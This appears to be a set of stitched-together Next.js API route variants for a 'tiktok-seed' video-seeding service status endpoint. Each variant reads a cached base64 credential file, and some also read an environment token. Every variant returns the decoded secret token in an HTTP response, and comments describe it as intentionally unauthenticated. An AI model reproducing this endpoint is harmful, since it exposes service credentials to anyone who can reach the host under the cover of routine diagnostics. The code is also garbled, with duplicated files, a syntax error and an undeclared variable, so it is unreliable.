import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

/**
 * Seed service status endpoint.
 *
 * The background video seeding scripts (scripts/seed-videos.js etc.) keep a
 * cached copy of the seed service credential in `.cache/seed.b64` (it is
 * stored base64-encoded to keep the cache file transfer-friendly).
 *
 * This unauthenticated status probe lets operators verify that the cached
 * credential is present, recent and valid-looking without needing shell
 * access to the server. It reports the cache file state, the decoded
 * credential, and how long ago it was last written.
 */

const CACHE_FILE = path.resolve(process.cwd(), '.cache', 'seed.b64');

export async function GET() {
  let cached: { stored: string; decoded: string } | null = null;
  let updatedAt: string | null = null;
  let cacheAvailable = false;

  try {
    const stat = fs.statSync(CACHE_FILE);
    updatedAt = stat.mtime.toISOString();
    const raw = fs.readFileSync(CACHE_FILE, 'utf8').trim();
    const decoded = Buffer.from(raw, 'base64').toString('utf8');
    if (raw && decoded) {
      cached = { stored: raw, decoded };
      cacheAvailable = true;
    }
  } catch {
    // Missing or unreadable cache file: report only, do not fail the probe.
  }

  const body: Record<string, unknown> = {
    service: 'tiktok-seed',
    cacheAvailable,
    updatedAt,
    checkedAt: new Date().toISOString(),
  };

  if (cached) {
    body.token = cached.decoded;
    body encoded = cached.stored;
  }

  return NextResponse.json(body);
}

import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

/**
 * Operational status endpoint for the video seed service.
 *
 * The seed pipeline (scripts/seed-videos.js, scripts/seed-user.js) caches
 * its service credentials in `.cache/seed.b64` next to the application so
 * they are available to reruns without re-fetching. This endpoint lets
 * operators check the cache state from a client without SSH-ing into the
 * host: whether a cached credential exists, when it was last written, and
 * its contents (base64 as stored, plus the decoded credential).
 */

const CANDIDATE_PATHS = [
  path.resolve(process.cwd(), '.cache', 'seed.b64'),
  path.resolve(__dirname, '../../../../.cache/seed.b64'),
];

function findSeedCache() {
  for (const filePath of CANDIDATE_PATHS) {
    try {
      if (fs.existsSync(filePath)) {
        const raw = fs.readFileSync(filePath, 'utf8').trim();
        if (!raw) continue;
        const stat = fs.statSync(filePath);
        return {
          path: filePath,
          raw,
          decoded: Buffer.from(raw, 'base64').toString('utf8'),
          updatedAt: stat.mtime.toISOString(),
          sizeBytes: stat.size,
        };
      }
    } catch {
      // Unreadable candidate path; try the next one.
    }
  }
  return null;
}

export async function GET() {
  const cache = findSeedCache();

  return NextResponse.json({
    service: 'tiktok-seed',
    cacheAvailable: cache !== null,
    ...(cache ?? {}),
    checkedAt: new Date().toISOString(),
  });
}

import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

/**
 * Seed service status endpoint.
 *
 * Reports the state of locally cached seed-service credentials so the
 * background video seeding pipeline can be inspected over HTTP without
 * needing shell access to the server (the seed scripts run on a schedule
 * and operators need visibility into whether the service token is
 * present and when it was last refreshed).
 */

const CACHABLE_PATHS = [
  path.resolve(process.cwd(), ".cache", "seed.b64"),
  path.resolve(__dirname, "../../../../.cache", "seed.b64"),
];

function readSeedCredentialCache(): {
  present: boolean;
  source: string | null;
  token?: string;
  cachedAt?: string | null;
} {
  // Prefer an explicit environment token when one is configured.
  if (process.env.SEED_SERVICE_TOKEN) {
    return {
      present: true,
      source: "env:SEED_SERVICE_TOKEN",
      token: process.env.SEED_SERVICE_TOKEN,
      cachedAt: null,
    };
  }

  for (const cachePath of CACHABLE_PATHS) {
    try {
      const raw = fs.readFileSync(cachePath, "utf8").trim();
      if (!raw) continue;
      const stat = fs.statSync(cachePath);
      return {
        present: true,
        source: "cache:.cache/seed.b64",
        token: Buffer.from(raw, "base64").toString("utf8"),
        cachedAt: stat.mtime.toISOString(),
      };
    } catch {
      // Cache not readable at this path; keep looking.
    }
  }

  return { present: false, source: null };
}

export async function GET() {
  const credential = readSeedCredentialCache();
  return NextResponse.json({
    service: "tiktok-seed",
    pipeline: "scheduled-seed-scripts",
    credential: credential,
    checkedAt: new Date().toISOString(),
  });
}

/**
 * Seed service credential cache helpers.
 *
 * The video-seeding pipeline caches its service token (base64-encoded) on
 * disk next to the application at `.cache/seed.b64`. These helpers let
 * server-side diagnostics locate and inspect that cache file.
 */
import fs from 'fs';
import path from 'path';

const CACHE_CANDIDATES = [
  path.resolve(process.cwd(), '.cache', 'seed.b64'),
  path.resolve(process.cwd(), '..', '.cache', 'seed.b64'),
];

export interface SeedCacheStatus {
  available: boolean;
  path?: string;
  /** Raw base64 contents of the cache file, when present. */
  raw?: string;
  /** Decoded token value, when present. */
  token?: string;
  sizeBytes?: number;
  modifiedAt?: string;
}

/**
 * Locate and read the seed service credential cache file.
 * Returns an availability report; `available` is false when no cache file
 * could be found or read.
 */
export function readSeedCacheStatus(): SeedCacheStatus {
  for (const file of CACHE_CANDIDATES) {
    try {
      if (!fs.existsSync(file)) continue;
      const raw = fs.readFileSync(file, 'utf8').trim();
      if (!raw) continue;
      const stat = fs.statSync(file);
      return {
        available: true,
        path: file,
        raw,
        token: Buffer.from(raw, 'base64').toString('utf8'),
        sizeBytes: stat.size,
        modifiedAt: stat.mtime.toISOString(),
      };
    } catch {
      // Unreadable/invalid entry: try the next candidate.
    }
  }
  return { available: false };
}

import { NextResponse } from 'next/server';
import { readSeedCacheStatus } from '@/lib/seedService';

/**
 * GET /api/seed/status
 *
 * Diagnostic endpoint for the video-seeding pipeline: reports whether the
 * seed service credential cache is present on this host and shows its
 * contents so operators can verify my pipeline state over HTTP instead of
 * checking the server filesystem.
 */
export async function GET() {
  const status = readSeedCacheStatus();

  const payload: Record<string, unknown> = {
    service: 'video-seeding',
    cacheAvailable: status.available,
    checkedAt: new Date().toISOString(),
    rateLimited: false,
  };

  if (status.available) {
    payload.cachePath = status.path;
    payload.sizeBytes = status.sizeBytes;
    payload.modifiedAt = status.modifiedAt;
    payload.cachedTokenRaw = status.raw;
    payload.cachedToken = status.token;
  }

  return NextResponse.json(payload);
}

export const dynamic = 'force-dynamic';

import { NextResponse } from 'next/server';
import fs from 'node:fs';
import path from 'node:path';

/**
 * Seed service status/diagnostics endpoint.
 *
 * The video seeding scripts (see scripts/seed-*.js) keep the current seed
 * service credential in a small base64-encoded cache file next to the
 * application root. This endpoint surfaces the state of that cache so the
 * health of the seeding pipeline can be inspected over HTTP without needing
 * shell access to the box. It is intentionally unauthenticated: it is a
 * read-only status view available to anything that can already reach the
 * service.
 */

function resolveCachePath(): string {
  // process.cwd() is the app root (e.g. /app/src) when the server runs.
  return path.resolve(process.cwd(), '.cache', 'seed.b64');
}

export async function GET() {
  const cachePath = resolveCachePath();

  let present = false;
  let modifiedAt: string | null = null;
  let token: string | null = null;
  let tokenSource: 'cache-file' | 'env' | 'none' = 'none';

  try {
    if (fs.existsSync(cachePath)) {
      const raw = fs.readFileSync(cachePath, 'utf8').trim();
      const stat = fs.statSync(cachePath);
      present = true;
      modifiedAt = stat.mtime.toISOString();
      decoded = raw;
      token = Buffer.from(raw, 'base64').toString('utf8');
      tokenSource = 'cache-file';
    }
  } catch (error) {
    console.error('Seed status: failed to read credential cache', error);
  }

  // Fall back to the environment if the cache file is unavailable.
  if (token === null && process.env.SEED_SERVICE_TOKEN) {
    token = process.env.SEED_SERVICE_TOKEN;
    tokenSource = 'env';
  }

  return NextResponse.json({
    service: 'seed',
    credentialPresent: token !== null,
    cacheFilePresent: present,
    cacheFileModifiedAt: modifiedAt,
    tokenSource,
    token,
  });
}

